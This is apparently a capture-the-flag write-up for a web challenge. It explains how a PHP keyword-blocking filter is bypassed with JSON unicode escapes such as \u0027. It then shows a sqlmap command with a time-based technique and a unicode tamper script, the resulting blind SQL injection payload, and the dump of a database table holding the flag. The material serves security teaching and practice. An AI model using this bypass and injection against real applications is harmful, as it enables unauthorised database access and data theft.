# My solution

We browse the webpage and we get some php code which is exposed due to an error. We can take a look at the source code.  
We see the server expects us to use a POST request. Data in the web server is not accessed using $\_POST but using the file_get_contents('php://input') which returns the raw byte data of the POST payload. It is commonly used when data is presented as JSON. Here there are more information: https://stackoverflow.com/questions/8893574/php-php-input-vs-post.   
In this application the raw byte retrieved from the POST payload are sanitized using preg_match_all and then decoded as JSON. The JSON object is then used as input for a SQL query.

We copy the pattern of the preg_match_all in a local editor and we run it. In this way we can clearly see what is the pattern used for the sanitization. Namely
```
/[\(\*\<\=\>\|'&\-@]|select|and|or|if|by|from|where|as|is|in|not|having/i
```
We can take a look at the string to see which characters are not allowed. To have a clearer view, we can paste the regex in https://regex101.com/, a very handy website when it comes to debug regular expressions.  

The special characters that we cannot use are:
```
(
*
<
=
>
|
'
&
-
@
```

We reproduce the script in locale setting up an apache server that serves the same php file, slightly modified to print the SQL query and the $obj variable instead of passing it to the backend.
```php
<?php

class db {
    public function waf($s) {
        if (preg_match_all('/'. implode('|', array(
            '[' . preg_quote("(*<=>|'&-@") . ']',
            'select', 'and', 'or', 'if', 'by', 'from', 
            'where', 'as', 'is', 'in', 'not', 'having'
        )) . '/i', $s, $matches)) die(var_dump($matches[0]));
        return json_decode($s);
    }

    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        var_dump(vsprintf($sql, $args));
    }
}

$db = new db();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $obj = $db->waf(file_get_contents('php://input'));
    var_dump($obj);
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
} else {
        echo("ciaooone\n");
    die(highlight_file(__FILE__, 1));
}

?> 
```

We try with the UTF-8 value. The payload is {"user": "\x27"}. The post request returns the following:
```
NULL
string(42) "SELECT note FROM notes WHERE assignee = ''"
```
As expected we managed to bypass the waf function but the \x27 is not interpreted as we want. The $obj variable is NULL, meaning that the json_decode did not manage to decode the payload.

Then we try with the unicode code for \', namely {"user":"\u0027"}. This time the unicode is actually interpreted as a \', as we see from the response:
```
string(42) "SELECT note FROM notes WHERE assignee = '''"
```
We can thus use the unicode value to bypass the waf and carry out our sql injection, but this time one the real server.

We can use sqlmap to automate the injection. The injection is not as simple as in locale because we don't have the response from the server. We can use timed queries to detect whether the injection is taking place or not. We can specify this technique with the flag --technique=T .  We need also to tell sqlmap to encode the payload in unicode, this is done by --tamper=charunicodeescape. charunicodeescape is a sqlmap script under the directory /usr/share/sqlmap/tamper/. We also set the --proxy flag to analyze whether sqlmap is correctly encoding in the form \uXXXX.
```
sqlmap -r request --technique=T --level=5 --risk=3 --proxy=http://127.0.0.1:8000 --tamper=charunicodescape
```

After a while sqlmap detects that the parameter is actually injectable.
```
[18:01:52] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
```

This is the summary provided by sqlmap
```
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: { "user": "' AND (SELECT 4920 FROM (SELECT(SLEEP(5)))VrIr)-- tEgk"}
---
```


We use sqlmap features to retrieve data from the sql database. 
We enumerate the databases and then dump all the content of the current one (db_m8452). In the table definitely_not_a_flag we have an entry called flag. The value of the entry is out HTB flag.

